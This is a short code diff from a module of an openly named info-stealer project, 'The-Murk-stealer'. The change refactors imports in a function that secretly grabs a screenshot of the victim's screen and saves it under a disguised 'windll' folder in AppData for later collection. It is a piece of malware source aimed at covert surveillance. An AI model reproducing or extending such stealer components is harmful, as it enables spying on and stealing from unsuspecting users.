@@ -10,12 +10,12 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 from PIL import ImageGrab
-import os
+from os import environ,sep
 # import cv2
 
 def Screenshot():
 	try:
-		pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+		pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
 		screen = ImageGrab.grab()
 		screen.save(rf'{pathtofolder}\windll\Photos\sreenshot.jpg')
 		print("screen")
